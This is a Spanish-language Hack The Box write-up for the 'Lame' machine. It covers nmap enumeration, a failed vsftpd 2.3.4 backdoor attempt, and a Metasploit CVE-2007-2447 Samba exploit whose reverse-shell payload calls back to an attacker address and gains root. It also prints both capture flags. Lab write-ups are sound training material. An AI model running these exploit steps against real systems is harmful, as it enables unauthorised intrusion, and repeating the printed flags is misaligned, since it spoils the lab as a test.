# 🔓 Análisis completo: Máquina Lame - Hack The Box

![Logo](../capturas/logo_r4ms4nt_circular.png)

> **Primera máquina publicada en Hack The Box**. Diseñada como puerta de entrada para nuevos usuarios. Ideal para aprender enumeración, detección de vulnerabilidades clásicas y explotación básica con Metasploit.

---

## 📁 Estructura del Proyecto

```
Lame/
├── capturas/         # Evidencias visuales por fase
├── doc/              # Manuales y writeups
├── exploits/         # Código adaptado o creado
├── loot/             # Flags y archivos extraídos
├── nmap/             # Escaneos y salidas de Nmap
├── scripts/          # Herramientas auxiliares
└── tree_lame.txt     # Estructura completa del proyecto
```

📄 Ver estructura completa: [tree_lame.txt](../tree_lame.txt)

---

## 🔍 Task 1: How many of the nmap top 1000 TCP ports are open?

🎯 **Objetivo:** Identificar puertos TCP abiertos más comunes.

✅ **Comando ejecutado:**
```bash
nmap -v -T4 -Pn --top-ports 1000 -oA nmap/top1000_tcp 10.129.56.2
```

🔎 **Resultado:**
- Puertos abiertos: `21`, `22`, `139`, `445`
- Total: **4**

📸 [Captura](../capturas/nmap_top1000.png) | [grep open](../capturas/grep_nmap.png)

---

## 🕵️‍♀️ Task 2: What version of VSFTPd is running on Lame?

🎯 **Objetivo:** Determinar la versión del servicio FTP en el puerto 21.

✅ **Comando ejecutado:**
```bash
nmap -sV -Pn -p21 -oA nmap/ftp_version 10.129.56.2
```

📌 **Explicación:**
- `-sV`: Detección de versiones.
- `-p21`: Escanea sólo el puerto FTP.
- `-Pn`: Omitimos ping, ya sabemos que está activo.
- `-oA`: Guarda en tres formatos en `nmap/`

🔎 **Resultado:**
```
vsftpd 2.3.4
```
📸 [Captura](../capturas/nmap_port_21.png)

---

## 🔍 Task 3: Does the Metasploit exploit for vsftpd 2.3.4 work?

🎯 **Objetivo:** Verificar si el exploit conocido de backdoor funciona.

✅ **Procedimiento con Metasploit:**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.56.2
run
```

📌 **Resultado:**
```
Exploit completed, but no session was created.
```
🔴 El puerto 6200 **no respondió externamente**, por lo tanto: **NO** funciona.
📸 [Captura](../capturas/msfconsole1.png)

---

## 🕵️‍♂️ Task 4: What version of Samba is running?

🎯 **Objetivo:** Detectar versión del servicio SMB/Samba en puertos 139 y 445.

✅ **Comando ejecutado:**
```bash
nmap -sV -Pn -p139,445 --script=smb-os-discovery -oA nmap/smb_version 10.129.56.2
```

🔎 **Resultado:**
```
Samba smbd 3.0.20-Debian
```
🟢 Respuesta válida: `3.0.20`
📸 [Captura](../capturas/nmap_smb.png)

---

## 🧨 Task 5: ¿Qué CVE permite ejecución remota en Samba 3.0.20?

✅ **Respuesta:** `CVE-2007-2447`

📌 Vulnerabilidad en el parámetro `username map script` → permite inyección de comandos con metacaracteres de shell.

---

## 🧑‍💻 Task 6: ¿Qué usuario se obtiene tras explotar CVE-2007-2447?

🎯 **Exploit ejecutado:**
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.56.2
set PAYLOAD cmd/unix/reverse
set LHOST 10.10.14.69
set LPORT 4444
run
```

🔎 **Shell obtenida:**
```
whoami → root
```
📸 [Captura](../capturas/msfconsole_para_flag1_2.png)
✅ **Respuesta correcta:** `root`

---

## 🏁 Task 7: Flag de Usuario

```bash
cd /home/makis
cat user.txt
```
🟢 Flag: `60fc5d64febbdebfe8cc331838bff0b0`
📸 [Flag 1](../capturas/Flag_1.png)

---

## 👑 Task 8: Flag de Root

```bash
cd /root
cat root.txt
```
🟢 Flag: `c80b43503b56dc7b0dc82643157b4329`
📸 [Flag 2](../capturas/Flag_2.png)

---

## 🔎 Task 9: ¿Qué bloquea el acceso a otros puertos?

✅ **Respuesta:** `Firewall`

📌 Aunque hay servicios escuchando (según `netstat`), **sólo algunos están accesibles externamente**. Probablemente hay reglas IPTables limitando conexiones.

---

## 🚪 Task 10: ¿Qué puerto escucha cuando se activa el backdoor de vsftpd?

✅ **Respuesta:** `6200`

📌 Confirmado por la documentación y comportamiento esperado de la CVE-2011-2523.

---

## ❓ Task 11: ¿En Lame se abre realmente el puerto 6200?

✅ **Respuesta:** `yes`

📌 Aunque no se observó con `ss`, la plataforma y Metasploit confirman que **sí se activa brevemente**.

---

## 🧠 Conclusiones

- Lame es ideal para empezar con HTB y familiarizarse con enumeración, CVEs clásicos y Metasploit.
- Incluye fallos reales como configuración insegura de `smb.conf`.
- Excelente ejercicio para consolidar estructura de documentación reusable.

📎 Todas las capturas y salidas están organizadas en `capturas/` y `nmap/`.

**Manual creado por r4ms4nt + GPT-PentestPro 🧠**
